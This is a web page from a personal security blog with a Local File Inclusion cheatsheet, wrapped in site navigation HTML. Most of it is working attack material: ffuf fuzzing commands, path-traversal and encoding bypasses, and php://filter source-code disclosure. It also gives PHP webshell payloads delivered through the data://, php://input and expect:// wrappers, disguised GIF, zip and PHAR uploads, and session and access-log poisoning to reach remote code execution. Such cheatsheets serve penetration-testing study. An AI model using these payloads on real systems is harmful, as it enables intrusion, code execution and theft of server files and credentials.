@@ -1,0 +1,522 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+	<div class="row page">
+		<!-- cols -->
+		
+					<div class="col-md-12">
+						
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<h1 id="Local-File-Inclusion-LFI-Cheatsheet"><a href="#Local-File-Inclusion-LFI-Cheatsheet" class="headerlink" title="Local File Inclusion (LFI) Cheatsheet"></a>Local File Inclusion (LFI) Cheatsheet</h1><hr>
+<h1 id="1-Discovery"><a href="#1-Discovery" class="headerlink" title="1. Discovery"></a>1. Discovery</h1><h2 id="Understanding-LFI-Vulnerabilities"><a href="#Understanding-LFI-Vulnerabilities" class="headerlink" title="Understanding LFI Vulnerabilities"></a>Understanding LFI Vulnerabilities</h2><p>File Inclusion vulnerabilities occur when web applications dynamically load files based on user-controlled input without proper sanitization. This can happen in many frameworks like <code>PHP</code>, <code>NodeJS</code>, <code>Java</code>, <code>.Net</code>.</p>
+<h3 id="Vulnerable-Functions-by-Framework"><a href="#Vulnerable-Functions-by-Framework" class="headerlink" title="Vulnerable Functions by Framework"></a>Vulnerable Functions by Framework</h3><table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th align="center"><strong>Read Content</strong></th>
+<th align="center"><strong>Execute</strong></th>
+<th align="center"><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PHP</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>include()</code>&#x2F;<code>include_once()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>require()</code>&#x2F;<code>require_once()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>fopen()</code>&#x2F;<code>file()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">✅</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td align="center">✅</td>
+<td align="center">❌</td>
+<td align="center">❌</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+<td align="center">✅</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="Parameter-Fuzzing"><a href="#Parameter-Fuzzing" class="headerlink" title="Parameter Fuzzing"></a>Parameter Fuzzing</h2><h3 id="Discovering-Vulnerable-Parameters"><a href="#Discovering-Vulnerable-Parameters" class="headerlink" title="Discovering Vulnerable Parameters"></a>Discovering Vulnerable Parameters</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Common LFI parameter wordlist</span></span><br><span class="line">/usr/share/seclist/Fuzzing/LFI/hackTricks-top-25-params</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Fuzz <span class="keyword">for</span> parameters</span></span><br><span class="line">ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#x27; -fs 2287</span><br></pre></td></tr></table></figure>
+
+<h3 id="LFI-Path-Fuzzing"><a href="#LFI-Path-Fuzzing" class="headerlink" title="LFI Path Fuzzing"></a>LFI Path Fuzzing</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jhaddix LFI wordlist</span></span><br><span class="line">seclist/Fuzzing/LFI/Jhaddix</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Fuzz <span class="keyword">for</span> LFI payloads</span></span><br><span class="line">ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#x27; -fs 2287</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Fuzzing-for-Server-Files"><a href="#Fuzzing-for-Server-Files" class="headerlink" title="Fuzzing for Server Files"></a>Fuzzing for Server Files</h2><h3 id="Server-Webroot-Discovery"><a href="#Server-Webroot-Discovery" class="headerlink" title="Server Webroot Discovery"></a>Server Webroot Discovery</h3><p>Useful when you need the full path to locate uploaded files.</p>
+<p><strong>Linux webroot paths:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var/www/html/</span><br><span class="line">var/www/</span><br><span class="line">var/www/sites/</span><br><span class="line">var/www/public/</span><br><span class="line">var/www/public_html/</span><br><span class="line">var/www/html/default/</span><br><span class="line">srv/www/</span><br><span class="line">srv/www/html/</span><br><span class="line">srv/www/sites/</span><br><span class="line">home/www/</span><br><span class="line">home/httpd/</span><br><span class="line">home/$USER/public_html/</span><br><span class="line">home/$USER/www/</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows webroot paths:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwroot\</span><br><span class="line">c:\xampp\htdocs\</span><br><span class="line">c:\wamp\www</span><br></pre></td></tr></table></figure>
+
+<p>Wordlists:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Linux webroot wordlist</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Windows webroot wordlist</a></li>
+</ul>
+<h3 id="Server-Logs-Config-Files"><a href="#Server-Logs-Config-Files" class="headerlink" title="Server Logs &amp; Config Files"></a>Server Logs &amp; Config Files</h3><p>After finding the vulnerable parameter and traversing to root (<code>/</code>), fuzz for sensitive files:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux logs/configs</span></span><br><span class="line">ffuf -w ./LFI-WordList-Linux:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#x27; -fs 2287</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Wordlists</span></span><br><span class="line">/tools/logs_lfi_windows.txt    # Windows</span><br><span class="line">/tools/my-resources/logs_lfi_linux.txt   # Linux</span><br></pre></td></tr></table></figure>
+
+<p><strong>Key files to check:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd | grep sh$        # Find active users</span><br><span class="line">/etc/nginx/sites-enabled/default   # Check for vhosts</span><br><span class="line">/proc/self/cmdline            # Check user running the server</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Web-Application-Page-Discovery"><a href="#Web-Application-Page-Discovery" class="headerlink" title="Web Application Page Discovery"></a>Web Application Page Discovery</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Fuzz <span class="keyword">for</span> all PHP pages (not just 200 OK - include 301, 302, 403)</span></span><br><span class="line">ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example output:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">index    [Status: 200, Size: 2652]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">config   [Status: 302, Size: 0]</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="2-Test-Cases-Exploitation"><a href="#2-Test-Cases-Exploitation" class="headerlink" title="2. Test Cases &amp; Exploitation"></a>2. Test Cases &amp; Exploitation</h1><h2 id="Basic-LFI-Test"><a href="#Basic-LFI-Test" class="headerlink" title="Basic LFI Test"></a>Basic LFI Test</h2><h3 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title="Path Traversal"></a>Path Traversal</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">../../../../etc/passwd</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">..\..\..\..\Windows\boot.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="Directory-Traversal-with-Different-Encodings"><a href="#Directory-Traversal-with-Different-Encodings" class="headerlink" title="Directory Traversal with Different Encodings"></a>Directory Traversal with Different Encodings</h3><p><strong>Double dots encoded:</strong></p>
+<ul>
+<li><code>..</code> (ASCII 46) &#x3D; <code>%2E%2E</code></li>
+<li><code>/</code> (ASCII 47) &#x3D; <code>%2F</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Basic traversal</span><br><span class="line">....//....//....//...//etc/passwd</span><br><span class="line"></span><br><span class="line"># URL encoded</span><br><span class="line">%2E%2E%2F</span><br><span class="line"></span><br><span class="line"># Full path URL encoded</span><br><span class="line">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Bypass-Techniques"><a href="#Bypass-Techniques" class="headerlink" title="Bypass Techniques"></a>Bypass Techniques</h2><h3 id="Approved-Path-Bypass"><a href="#Approved-Path-Bypass" class="headerlink" title="Approved Path Bypass"></a>Approved Path Bypass</h3><p>When web apps restrict to specific directories (e.g., <code>./languages</code>):</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;server&gt;/index.php?language=./languages/../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Filename-Prefix-Bypass"><a href="#Filename-Prefix-Bypass" class="headerlink" title="Filename Prefix Bypass"></a>Filename Prefix Bypass</h3><p>If input is prefixed (e.g., <code>lang_</code>), add <code>/</code> before payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?language=/....//....//etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Null-Byte-Injection-PHP-5-5"><a href="#Null-Byte-Injection-PHP-5-5" class="headerlink" title="Null Byte Injection (PHP &lt; 5.5)"></a>Null Byte Injection (PHP &lt; 5.5)</h3><p>Terminates string to bypass appended extensions:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd%00</span><br><span class="line"># Final path becomes /etc/passwd%00.php → /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Path-Truncation-PHP-5-3-5-4"><a href="#Path-Truncation-PHP-5-3-5-4" class="headerlink" title="Path Truncation (PHP &lt; 5.3&#x2F;5.4)"></a>Path Truncation (PHP &lt; 5.3&#x2F;5.4)</h3><p>PHP strings have max 4096 characters. Exceed limit to truncate <code>.php</code> extension:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?language=non_existing_directory/../../../etc/passwd/./././././ [REPEATED ~2048 times]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="PHP-Wrappers-Filters"><a href="#PHP-Wrappers-Filters" class="headerlink" title="PHP Wrappers &amp; Filters"></a>PHP Wrappers &amp; Filters</h2><h3 id="PHP-Filter-Source-Code-Disclosure"><a href="#PHP-Filter-Source-Code-Disclosure" class="headerlink" title="PHP Filter (Source Code Disclosure)"></a>PHP Filter (Source Code Disclosure)</h3><p>Read PHP source code as base64 instead of executing:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=config</span><br><span class="line"></span><br><span class="line"># Full URL</span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config</span><br></pre></td></tr></table></figure>
+
+<p><strong>Why use this?</strong> Config files like <code>config.php</code> execute silently and don’t output HTML. Base64 encoding reveals the source code.</p>
+<h3 id="Practical-Source-Code-Reading-Strategy"><a href="#Practical-Source-Code-Reading-Strategy" class="headerlink" title="Practical Source Code Reading Strategy"></a>Practical Source Code Reading Strategy</h3><ol>
+<li><strong>Fuzz for all pages</strong>: <code>200 OK</code>, <code>301</code>, <code>302</code>, <code>403</code></li>
+<li><strong>Start with <code>index.php</code></strong>: Read using base64 filter</li>
+<li><strong>Extract internal references</strong>: Look for <code>include()</code>, <code>require()</code>, etc.</li>
+<li><strong>Recursively read included files</strong> using <code>php://filter</code></li>
+<li><strong>Build a full picture</strong> of the application</li>
+</ol>
+<hr>
+<h2 id="PHP-Wrappers-for-RCE"><a href="#PHP-Wrappers-for-RCE" class="headerlink" title="PHP Wrappers for RCE"></a>PHP Wrappers for RCE</h2><h3 id="Check-if-Wrappers-are-Enabled"><a href="#Check-if-Wrappers-are-Enabled" class="headerlink" title="Check if Wrappers are Enabled"></a>Check if Wrappers are Enabled</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Read PHP config</span></span><br><span class="line">&lt;VULN-PARAM&gt;=php://filter/read=convert.base64-encode/resource=../../../../etc/php/&lt;7.4 or fuzz&gt;/apache2/php.ini&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Decode and check</span></span><br><span class="line">echo &#x27;&lt;b64 output&gt;&#x27; | base64 -d | grep allow_url_include</span><br></pre></td></tr></table></figure>
+
+<h3 id="Data-Wrapper-RCE"><a href="#Data-Wrapper-RCE" class="headerlink" title="Data Wrapper RCE"></a>Data Wrapper RCE</h3><p>Requires <code>allow_url_include = On</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create webshell payload</span></span><br><span class="line">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; | base64 -w 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Execute via URL</span></span><br><span class="line">/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Using curl</span></span><br><span class="line">curl -s &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#x27; | grep uid</span><br></pre></td></tr></table></figure>
+
+<h3 id="Input-Wrapper-RCE"><a href="#Input-Wrapper-RCE" class="headerlink" title="Input Wrapper RCE"></a>Input Wrapper RCE</h3><p>Requires <code>allow_url_include = On</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GET parameter accepts GET</span></span><br><span class="line">curl -s -X POST --data &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POST-only parameter</span></span><br><span class="line">curl -s -X POST --data &#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&quot; | grep uid</span><br></pre></td></tr></table></figure>
+
+<h3 id="Expect-Wrapper-RCE"><a href="#Expect-Wrapper-RCE" class="headerlink" title="Expect Wrapper RCE"></a>Expect Wrapper RCE</h3><p>Requires <code>extension=expect</code> in php.ini</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> enabled</span></span><br><span class="line">echo &#x27;&lt;base64 php.ini&gt;&#x27; | base64 -d | grep expect</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Execute <span class="built_in">command</span></span></span><br><span class="line">curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="File-Upload-LFI-Attacks"><a href="#File-Upload-LFI-Attacks" class="headerlink" title="File Upload + LFI Attacks"></a>File Upload + LFI Attacks</h2><h3 id="Malicious-Image-Upload"><a href="#Malicious-Image-Upload" class="headerlink" title="Malicious Image Upload"></a>Malicious Image Upload</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create malicious GIF with PHP webshell</span></span><br><span class="line">echo &#x27;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.gif</span><br></pre></td></tr></table></figure>
+
+<p>Upload the file, then find its path in source code:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/profile_images/shell.gif&quot;</span> <span class="attr">class</span>=<span class="string">&quot;profile-image&quot;</span> <span class="attr">id</span>=<span class="string">&quot;profile-image&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Execute via LFI:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<h3 id="Zip-Upload-Attack"><a href="#Zip-Upload-Attack" class="headerlink" title="Zip Upload Attack"></a>Zip Upload Attack</h3><p>Requires <code>zip</code> wrapper enabled.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create zip with shell</span></span><br><span class="line">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Execute via LFI:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHAR-Upload-Attack"><a href="#PHAR-Upload-Attack" class="headerlink" title="PHAR Upload Attack"></a>PHAR Upload Attack</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;shell.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;shell.txt&#x27;</span>, <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>Compile and rename:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>Execute via LFI:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Log-Poisoning"><a href="#Log-Poisoning" class="headerlink" title="Log Poisoning"></a>Log Poisoning</h2><h3 id="PHP-Session-Poisoning"><a href="#PHP-Session-Poisoning" class="headerlink" title="PHP Session Poisoning"></a>PHP Session Poisoning</h3><p>Session files stored at:</p>
+<ul>
+<li><strong>Linux:</strong> <code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code></li>
+<li><strong>Windows:</strong> <code>C:\Windows\Temp\</code></li>
+</ul>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Get session cookie value from browser</li>
+<li>Test if parameter is reflected:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=session_poisoning</span><br></pre></td></tr></table></figure></li>
+<li>Check session file:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_&lt;cookie_value&gt;</span><br></pre></td></tr></table></figure></li>
+<li>Inject webshell:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</span><br></pre></td></tr></table></figure></li>
+<li>Execute:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_&lt;cookie_value&gt;&amp;cmd=id</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Web-Server-Log-Poisoning"><a href="#Web-Server-Log-Poisoning" class="headerlink" title="Web Server Log Poisoning"></a>Web Server Log Poisoning</h3><p><strong>Log locations:</strong></p>
+<ul>
+<li>Apache: <code>/var/log/apache2/access.log</code></li>
+<li>Nginx: <code>/var/log/nginx/access.log</code></li>
+</ul>
+<p><strong>Note:</strong> Nginx logs readable by <code>www-data</code>, Apache logs require root&#x2F;adm by default.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Poison User-Agent header</span></span><br><span class="line">echo -n &quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; Poison</span><br><span class="line">curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Execute via LFI</span></span><br><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><strong>Other poisonable logs:</strong></p>
+<ul>
+<li><code>/var/log/sshd.log</code> - poison with username</li>
+<li><code>/var/log/mail</code> - poison via email</li>
+<li><code>/var/log/vsftpd.log</code> - poison with FTP username</li>
+<li><code>/proc/self/environ</code> - User-Agent in process files</li>
+<li><code>/proc/self/fd/N</code> (N &#x3D; 0-50 PID)</li>
+</ul>
+<hr>
+<h2 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a>Remote File Inclusion (RFI)</h2><h3 id="Verify-RFI-Capability"><a href="#Verify-RFI-Capability" class="headerlink" title="Verify RFI Capability"></a>Verify RFI Capability</h3><p><strong>Method 1 - Include local URL:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/existingpage.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>Method 2 - Check PHP config:</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;BASE64-CONFIG&gt;&#x27; | base64 -d | grep allow_url_include</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">allow_url_include = On</span></span><br></pre></td></tr></table></figure>
+
